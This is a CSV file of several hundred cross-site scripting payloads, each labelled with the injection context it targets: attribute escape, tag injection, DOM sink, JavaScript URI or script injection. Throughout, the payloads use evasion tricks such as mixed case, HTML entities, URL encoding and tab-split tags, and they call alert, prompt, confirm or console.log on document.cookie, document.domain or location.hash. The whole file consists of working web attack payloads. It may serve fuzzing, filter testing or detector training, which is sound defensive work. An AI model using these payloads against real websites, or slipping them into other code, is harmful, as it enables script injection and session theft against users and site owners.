payload,context
' oNmoUseOveR=cOnfIrm(doCumEnt.doMaiN) ',attribute_escape
"document.write(""<img src=x onerror=prompt(document.domain)>"")",dom_sink
<svG oNmoUseEntEr=ConFirM(1)/>,tag_injection
"""><Svg onMouSeoVer=alErt(1)>",tag_injection
<svg onerror=prompt(%27XSS%27)/>,tag_injection
"%3Csvg ontoggle=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
<svg onmous&#101;ov&#101;r=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
"""><Svg onErrOr=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
%27 onload=prompt(document.domain) %27,attribute_escape
javascr	ipt:void(console.log('XSS')),js_uri
""" onfocus=confirm(document.cookie) """,attribute_escape
<svg onmouseenter=console.log(document.domain)>,tag_injection
"SetTimEouT(""ProMpt(StRinG.fRomChaRCoDe(88,83,83))"",0)",dom_sink
<svg onfocus=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
javascript:confirm(document.domain),js_uri
%22><svg onfocus=alert(1)>,tag_injection
<script>confirm`loc&#97;tion.h&#97;sh`</script>,script_injection
<svg onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
"""%3E%3Csvg onmouseenter=console.log(1)%3E",tag_injection
"""><svg onfocus=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
<svg onclick=consol&#101;.log('XSS')>,tag_injection
"""%3E%3Csvg ontoggle=console.log('XSS')%3E",tag_injection
' onmous&#101;ov&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
%27 onbegin=confirm(1) %27,attribute_escape
"""><svg onclick=alert('XSS')>",tag_injection
"""><svg onfocus=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
' oNtoGglE=aLerT(lOcaTioN.hAsh) ',attribute_escape
' onb&#101;gin=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
%3Csvg onmouseenter=confirm(1)/%3E,tag_injection
<svG oNmoUseEntEr=ProMpt(doCumEnt.doMaiN)/>,tag_injection
%27 ontoggle=alert(document.cookie) %27,attribute_escape
<svg ontoggle=confirm(1)>,tag_injection
<script>/x/prompt(1)</script>,script_injection
<svg onload=\u0061lert(document.cookie)>,tag_injection
"<svg onfocus=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
<svg onmouseenter=alert(document.cookie)/>,tag_injection
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
%22><svg onfocus=console.log(1)>,tag_injection
"""><svg onfocus=console.log(String.fromCharCode(88,83,83))>",tag_injection
%3Cscript%3E/x/confirm(location.hash)%3C/script%3E,script_injection
%22 onclick=console.log(location.hash) %22,attribute_escape
"setTimeout(""alert(String.fromCharCode(88,83,83))"",0)",dom_sink
<script>//&#97;l&#101;rt(loc&#97;tion.h&#97;sh)</script>,script_injection
"<svg onmouseover=console.log(String.fromCharCode(88,83,83))/>",tag_injection
""" onbegin=prompt(location.hash) """,attribute_escape
%22 onmouseenter=alert(location.hash) %22,attribute_escape
""" onmous&#101;&#101;nt&#101;r=consol&#101;.log('XSS') """,attribute_escape
<svG oNmoUseEntEr=ConSolE.lOg('XSS')/>,tag_injection
javascript:void(\u0061lert(document.cookie)),js_uri
<scr	ipt>/x/confirm(location.hash)</scr	ipt>,script_injection
""" onclick=consol&#101;.log(1) """,attribute_escape
""" ontoggle=\u0061lert(document.domain) """,attribute_escape
"' on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
""" onmouseover=prompt(1) """,attribute_escape
"""><svg onmouseenter=prompt(String.fromCharCode(88,83,83))>",tag_injection
"' on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
' oNfoCus=coNsoLe.Log(1) ',attribute_escape
"<svg onerror=alert(String.fromCharCode(88,83,83))/>",tag_injection
"eval(""prompt(document.domain)"")",dom_sink
%22 onclick=alert(document.domain) %22,attribute_escape
""" onmouseover=alert(location.hash) """,attribute_escape
"<svg onmouseover=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
<svg onerror=\u0061lert(1)>,tag_injection
<svG oNmoUseEntEr=ConSolE.lOg('XSS')>,tag_injection
' oNmoUseEntEr=ConSolE.lOg(DocUmeNt.DomAin) ',attribute_escape
%22><svg onmouseenter=confirm(%27XSS%27)>,tag_injection
"<svg ontoggle=prompt(String.fromCharCode(88,83,83))>",tag_injection
"""><svg onload=prompt(1)>",tag_injection
<imG oNloAd=AleRt(LocAtiOn.HasH)/>,tag_injection
<svG oNloAd=ProMpt(1)>,tag_injection
javascript:alert(document.domain),js_uri
"document.write(""<img src=x onerror=console.log('XSS')>"")",dom_sink
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
<svG oNtoGglE=cOnfIrm('XSS')>,tag_injection
<scr	ipt>//prompt(document.domain)</scr	ipt>,script_injection
' onbegin=prompt(location.hash) ',attribute_escape
"%22 onmouseenter=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
<svg ontoggl&#101;=&#97;l&#101;rt(1)>,tag_injection
""" oNfoCus=alErt(doCumEnt.coOkiE) AutOfoCus=""",attribute_escape
<svG oNclIck=coNfiRm(DocUmeNt.CooKie)>,tag_injection
"""><svg onerror=prompt(String.fromCharCode(88,83,83))>",tag_injection
%3Csvg onclick=confirm(document.cookie)%3E,tag_injection
<svg onmouseenter=console.log(location.hash)/>,tag_injection
<svg ontoggle=alert('XSS')>,tag_injection
"""><svg on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""%3E%3Csvg onbegin=prompt(document.cookie)%3E",tag_injection
%3Cscript%3E//alert(1)%3C/script%3E,script_injection
"setTimeout(%22alert(document.cookie)%22,0)",dom_sink
%22><svg onclick=console.log(document.domain)>,tag_injection
""" onfocus=prompt(1) &#97;utofocus=""",attribute_escape
"""><Svg onErrOr=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"""><Svg onMouSeoVer=prOmpT(lOcaTioN.hAsh)>",tag_injection
"""><svg ontoggle=prompt(document.domain)>",tag_injection
%27 onfocus=prompt(document.cookie) %27,attribute_escape
<svg onmous&#101;&#101;nt&#101;r=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
<svG oNbeGin=alErt('XSS')/>,tag_injection
"%27 onload=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
<svG oNclIck=prOmpT(1)>,tag_injection
"""><svg ontoggle=alert('XSS')>",tag_injection
""" onlo&#97;d=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
<scr	ipt>//alert('XSS')</scr	ipt>,script_injection
' onmouseover=\u0061lert('XSS') ',attribute_escape
"' onclick=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
' onfocus=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
"""%3E%3Csvg onload=console.log(location.hash)%3E",tag_injection
<script>confirm(document.domain)</script>,script_injection
%22><svg onerror=confirm(document.cookie)>,tag_injection
"<svg on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
""" oNbeGin=prOmpT(dOcuMenT.cOokIe) """,attribute_escape
<svg onb&#101;gin=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
""" onclick=\u0061lert(1) """,attribute_escape
""" oNmoUseOveR=aLerT(lOcaTioN.hAsh) """,attribute_escape
"""%3E%3Csvg ontoggle=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
<svg onlo&#97;d=consol&#101;.log(1)/>,tag_injection
""" onmouseenter=console.log(1) """,attribute_escape
"""><Svg onFocUs=ConFirM(lOcaTioN.hAsh)>",tag_injection
%27 onclick=alert(1) %27,attribute_escape
%22><svg onclick=prompt(%27XSS%27)>,tag_injection
"""%3E%3Csvg onfocus=alert(1)%3E",tag_injection
%27 onmouseenter=confirm(location.hash) %27,attribute_escape
%22 onmouseenter=confirm(location.hash) %22,attribute_escape
<scRipT>pRomPt(LocAtiOn.HasH)</scRipT>,script_injection
' on&#101;rror=confirm('XSS') ',attribute_escape
<svG oNmoUseOveR=aLerT(dOcuMenT.dOmaIn)>,tag_injection
""" onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
<script>/*/prompt(docum&#101;nt.cooki&#101;)</script>,script_injection
<svG oNtoGglE=pRomPt(DocUmeNt.DomAin)/>,tag_injection
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection
""" oNclIck=coNfiRm(LocAtiOn.HasH) """,attribute_escape
j&#97;vascr	ipt:alert(1),js_uri
"&#101;v&#97;l(""consol&#101;.log(1)"")",dom_sink
<svg onbegin=confirm(%27XSS%27)>,tag_injection
j&#97;vascript:confirm(1),js_uri
""" oNmoUseEntEr=ProMpt(doCumEnt.coOkiE) """,attribute_escape
""" onfocus=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) &#97;utofocus=""",attribute_escape
"""><svg onlo&#97;d=&#97;l&#101;rt(1)>",tag_injection
%3Csvg onload=prompt('XSS')%3E,tag_injection
<svg onfocus=console.log(%27XSS%27)>,tag_injection
<scr	ipt>console.log(location.hash)</scr	ipt>,script_injection
<svG oNfoCus=prOmpT(dOcuMenT.dOmaIn)/>,tag_injection
<scr	ipt>prompt`location.hash`</scr	ipt>,script_injection
' onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) ',attribute_escape
<svg onmous&#101;ov&#101;r=prompt('XSS')/>,tag_injection
%27 onclick=prompt(location.hash) %27,attribute_escape
<scr	ipt>alert`1`</scr	ipt>,script_injection
"%3Csvg onmouseover=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
' onmous&#101;&#101;nt&#101;r=confirm(1) ',attribute_escape
' onclick=prompt(document.domain) ',attribute_escape
"""><svg ontoggle=prompt(document.cookie)>",tag_injection
"%3Csvg onmouseenter=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
<svg ontoggl&#101;=consol&#101;.log(1)>,tag_injection
""" onfocus=prompt(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape
' oNclIck=alErt(loCatIon.haSh) ',attribute_escape
<scr	ipt>//confirm(document.domain)</scr	ipt>,script_injection
<svg onbegin=console.log(document.cookie)/>,tag_injection
"""><svg onb&#101;gin=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
""" oNfoCus=prOmpT(dOcuMenT.cOokIe) """,attribute_escape
""" onlo&#97;d=prompt(docum&#101;nt.cooki&#101;) """,attribute_escape
<svG oNfoCus=alErt(loCatIon.haSh)/>,tag_injection
<svg onmouseover=console.log(1)/>,tag_injection
<svG oNmoUseEntEr=ProMpt('XSS')>,tag_injection
""" oNmoUseEntEr=ConSolE.lOg(DocUmeNt.CooKie) """,attribute_escape
<svg onbegin=\u0061lert('XSS')/>,tag_injection
"""%3E%3Csvg onclick=prompt('XSS')%3E",tag_injection
%27 onmouseover=alert(%27XSS%27) %27,attribute_escape
<img onload=alert(document.domain)>,tag_injection
' onmouseover=alert(document.domain) ',attribute_escape
<script>\u0061lert('XSS')</script>,script_injection
"""><svg onclick=alert(String.fromCharCode(88,83,83))>",tag_injection
' onfocus=prompt('XSS') ',attribute_escape
<svg onlo&#97;d=prompt('XSS')/>,tag_injection
"%22><svg onmouseenter=confirm(String.fromCharCode(88,83,83))>",tag_injection
<svG oNloAd=ConSolE.lOg(LocAtiOn.HasH)/>,tag_injection
"<scRipT>/X/cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
' oNerRor=coNfiRm(1) ',attribute_escape
<svG oNclIck=prOmpT('XSS')/>,tag_injection
<svG oNmoUseOveR=cOnfIrm(loCatIon.haSh)>,tag_injection
""" onfocus=prompt('XSS') autofocus=""",attribute_escape
' oNmoUseEntEr=ProMpt(doCumEnt.doMaiN) ',attribute_escape
' onclick=confirm('XSS') ',attribute_escape
' oNbeGin=coNfiRm(1) ',attribute_escape
' onlo&#97;d=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
""" onmouseover=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
<svG oNtoGglE=aLerT('XSS')/>,tag_injection
""" oNclIck=prOmpT(lOcaTioN.hAsh) """,attribute_escape
<img onload=\u0061lert(1)>,tag_injection
"&#101;v&#97;l(""prompt(docum&#101;nt.cooki&#101;)"")",dom_sink
<svg onclick=prompt(1)/>,tag_injection
"""><Svg onTogGle=coNfiRm(LocAtiOn.HasH)>",tag_injection
<scRipT>/X/pRomPt(1)</scRipT>,script_injection
<svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
<svg onlo&#97;d=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection
<script>/*/console.log(%27XSS%27)</script>,script_injection
<svg onerror=\u0061lert(document.domain)/>,tag_injection
"""><svg onmous&#101;ov&#101;r=consol&#101;.log('XSS')>",tag_injection
"eval(""\u0061lert(String.fromCharCode(88,83,83))"")",dom_sink
%3Cscript%3Econsole.log`'XSS'`%3C/script%3E,script_injection
"""%3E%3Csvg onclick=alert(document.cookie)%3E",tag_injection
<script>/x/alert(location.hash)</script>,script_injection
"%27 onmouseenter=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
"%3Csvg onload=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<svg onfocus=alert(document.cookie)/>,tag_injection
""" onclick=console.log(document.cookie) """,attribute_escape
<svG oNloAd=ProMpt(loCatIon.haSh)/>,tag_injection
' onb&#101;gin=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
<svG oNmoUseOveR=cOnfIrm(1)/>,tag_injection
""" ontoggle=console.log(document.cookie) """,attribute_escape
<svG oNtoGglE=cOnfIrm(doCumEnt.coOkiE)/>,tag_injection
""" onload=confirm('XSS') """,attribute_escape
""" onfocus=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
%27 onerror=alert(document.domain) %27,attribute_escape
<svg onmous&#101;&#101;nt&#101;r=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
%22 onbegin=confirm(1) %22,attribute_escape
%3Csvg onbegin=alert(document.domain)%3E,tag_injection
"""><svg ontoggl&#101;=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
""" oNloAd=ConSolE.lOg(1) """,attribute_escape
""" onfocus=alert(document.domain) autofocus=""",attribute_escape
%22><svg onfocus=alert(document.domain)>,tag_injection
%3Csvg onbegin=alert(location.hash)%3E,tag_injection
' onmous&#101;&#101;nt&#101;r=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
%22 onfocus=prompt(1) %22,attribute_escape
<svG oNmoUseEntEr=ProMpt(doCumEnt.coOkiE)/>,tag_injection
<svg onfocus=&#97;l&#101;rt('XSS')>,tag_injection
"<svG oNfoCus=prOmpT(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
<script>/*/alert(document.domain)</script>,script_injection
""" oNclIck=alErt(loCatIon.haSh) """,attribute_escape
"document.write(""%3Cimg src=x onerror=confirm(document.domain)%3E"")",dom_sink
<svg onbegin=console.log('XSS')>,tag_injection
<svG oNmoUseOveR=pRomPt(LocAtiOn.HasH)>,tag_injection
<svG oNclIck=coNfiRm(1)>,tag_injection
<script>/x/consol&#101;.log(loc&#97;tion.h&#97;sh)</script>,script_injection
%22><svg onmouseover=confirm(location.hash)>,tag_injection
<scr	ipt>prompt(document.domain)</scr	ipt>,script_injection
<svg onbegin=console.log(1)>,tag_injection
<svg onfocus=confirm('XSS')/>,tag_injection
' onlo&#97;d=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
j&#97;v&#97;script:void(confirm(docum&#101;nt.dom&#97;in)),js_uri
%3Csvg onclick=console.log('XSS')/%3E,tag_injection
%22 onload=prompt(1) %22,attribute_escape
' oNtoGglE=aLerT(1) ',attribute_escape
<script>console.log`%27XSS%27`</script>,script_injection
<scRipT>cOnfIrm`1`</sCriPt>,script_injection
%3Csvg onmouseenter=confirm('XSS')%3E,tag_injection
""" onerror=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
<svG oNtoGglE=cOnsOle.loG(dOcuMenT.cOokIe)>,tag_injection
<svg ontoggl&#101;=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
"document.write(""%3Cimg src=x onerror=confirm(document.cookie)%3E"")",dom_sink
%3Csvg onclick=prompt(document.domain)%3E,tag_injection
%27 onmouseenter=alert(location.hash) %27,attribute_escape
%3Cimg onload=prompt('XSS')/%3E,tag_injection
""" on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
%3Csvg onmouseover=confirm(document.cookie)%3E,tag_injection
"""><Svg onMouSeeNteR=aLerT('XSS')>",tag_injection
' onerror=confirm('XSS') ',attribute_escape
""" ontoggle=alert(location.hash) """,attribute_escape
""" oNmoUseEntEr=ConFirM('XSS') """,attribute_escape
j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.cooki&#101;),js_uri
"' oNtoGglE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
%22 ontoggle=confirm(document.domain) %22,attribute_escape
"""><svg ontoggl&#101;=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
""" oNerRor=coNfiRm(DocUmeNt.DomAin) """,attribute_escape
' on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
<svg onmous&#101;ov&#101;r=prompt('XSS')>,tag_injection
"<svg onclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
' onmouseover=confirm(location.hash) ',attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(1)>"")",dom_sink
""" ontoggle=\u0061lert(1) """,attribute_escape
<script>/*/prompt(document.domain)</script>,script_injection
"""><Svg onTogGle=alErt(doCumEnt.doMaiN)>",tag_injection
""" ontoggle=confirm(document.cookie) """,attribute_escape
%22 onfocus=prompt(location.hash) %22,attribute_escape
%22><svg onload=console.log(document.domain)>,tag_injection
<scRipT>/X/aLerT('XSS')</scRipT>,script_injection
"<script>/x/confirm(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"""><Img onLoaD=aLerT(1)>",tag_injection
%3Cscript%3E/*/alert(1)%3C/script%3E,script_injection
"""%3E%3Csvg onmouseover=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"<svg onfocus=alert(String.fromCharCode(88,83,83))/>",tag_injection
' on&#101;rror=&#97;l&#101;rt('XSS') ',attribute_escape
"""><svg onfocus=prompt(1)>",tag_injection
<svg onmouseover=console.log('XSS')>,tag_injection
<scRipT>/X/cOnfIrm(doCumEnt.coOkiE)</scRipT>,script_injection
<svG oNbeGin=coNsoLe.Log(loCatIon.haSh)/>,tag_injection
"""%3E%3Csvg onbegin=prompt(location.hash)%3E",tag_injection
<svg onmous&#101;&#101;nt&#101;r=confirm('XSS')>,tag_injection
%3Cimg onload=alert(location.hash)/%3E,tag_injection
' oNclIck=coNfiRm(DocUmeNt.CooKie) ',attribute_escape
"%27 onfocus=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
"""%3E%3Csvg onmouseover=alert('XSS')%3E",tag_injection
<svG oNtoGglE=pRomPt(1)/>,tag_injection
<svg onfocus=prompt(document.domain)/>,tag_injection
%22><svg onmouseenter=alert(document.cookie)>,tag_injection
""" onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<svG oNfoCus=coNfiRm(DocUmeNt.DomAin)>,tag_injection
%3Cscript%3E/*/confirm(document.domain)%3C/script%3E,script_injection
"""><svg on&#101;rror=consol&#101;.log('XSS')>",tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
<svG oNbeGin=alErt(doCumEnt.coOkiE)>,tag_injection
"""><svg on&#101;rror=confirm('XSS')>",tag_injection
%3Cscript%3E//confirm(1)%3C/script%3E,script_injection
<scRipT>/X/cOnfIrm('XSS')</ScrIpt>,script_injection
"' ontoggle=alert(String.fromCharCode(88,83,83)) '",attribute_escape
"<svg ontoggle=console.log(String.fromCharCode(88,83,83))/>",tag_injection
<scr	ipt>//prompt('XSS')</scr	ipt>,script_injection
<scr	ipt>prompt(1)</scr	ipt>,script_injection
"%22><svg onload=confirm(String.fromCharCode(88,83,83))>",tag_injection
<scRipT>cOnsOle.loG`1`</ScrIpt>,script_injection
"<svg onfocus=prompt(String.fromCharCode(88,83,83))>",tag_injection
' ontoggl&#101;=consol&#101;.log('XSS') ',attribute_escape
"%3Csvg onmouseover=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
""" onmous&#101;ov&#101;r=prompt(1) """,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(1)>"")",dom_sink
<svG oNloAd=ConSolE.lOg(DocUmeNt.CooKie)/>,tag_injection
j&#97;vascript:console.log(document.domain),js_uri
%22 onclick=alert(%27XSS%27) %22,attribute_escape
<svG oNbeGin=alErt(doCumEnt.doMaiN)/>,tag_injection
%22><svg onmouseenter=prompt(document.domain)>,tag_injection
"%22 onload=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
"""><svg onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
"setTimeout(""console.log(document.cookie)"",0)",dom_sink
<svG oNerRor=alErt(doCumEnt.doMaiN)>,tag_injection
<script>//consol&#101;.log('XSS')</script>,script_injection
<script>//alert('XSS')</script>,script_injection
""" onerror=alert(document.cookie) """,attribute_escape
""" onfocus=alert(location.hash) autofocus=""",attribute_escape
<svg onmouseover=\u0061lert('XSS')/>,tag_injection
%3Csvg ontoggle=confirm(document.cookie)/%3E,tag_injection
